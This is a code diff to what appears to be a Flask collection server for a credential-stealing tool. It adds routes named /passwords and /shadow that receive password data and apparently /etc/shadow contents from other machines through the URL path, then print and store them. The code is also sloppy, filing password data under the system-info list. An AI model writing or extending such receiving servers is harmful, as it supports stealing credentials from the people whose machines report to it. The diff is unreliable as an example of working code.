@@ -36,6 +36,12 @@ class InstalledPrograms:
 progr = InstalledPrograms()
 progr.installed = []
 
+class Passwords:
+    pinfo = None
+
+pswd = Passwords()
+pswd.pinfo = []
+
 class SystemInfo:
     info = None
 
@@ -197,6 +203,28 @@ def os_type(msg):
         print("Did not insert system info into database.")
     sysinfo.info = []
     db_connection.close()
+    return render_template('basic.html', bodyText="")
+
+
+@app.route('/passwords/<msg>', methods=['POST', 'GET'])
+def passwords(msg):
+    if msg is None:
+        logger.debug('Did not receive passwords data.')
+        return render_template('basic.html')
+    normalStr = msg.replace("_RRR_", "/")
+    print(normalStr)
+    myarr = normalStr.split(':')
+    sysinfo.info.append(myarr[0])
+    #TODO: figure out if we need this at all.
+    return render_template('basic.html', bodyText="")
+
+
+@app.route('/shadow/<msg>', methods=['POST', 'GET'])
+def shadow(msg):
+    if msg is None:
+        logger.debug('Did not receive passwords data.')
+        return render_template('basic.html')
+    print("HERE ", msg)
     return render_template('basic.html', bodyText="")
 
 
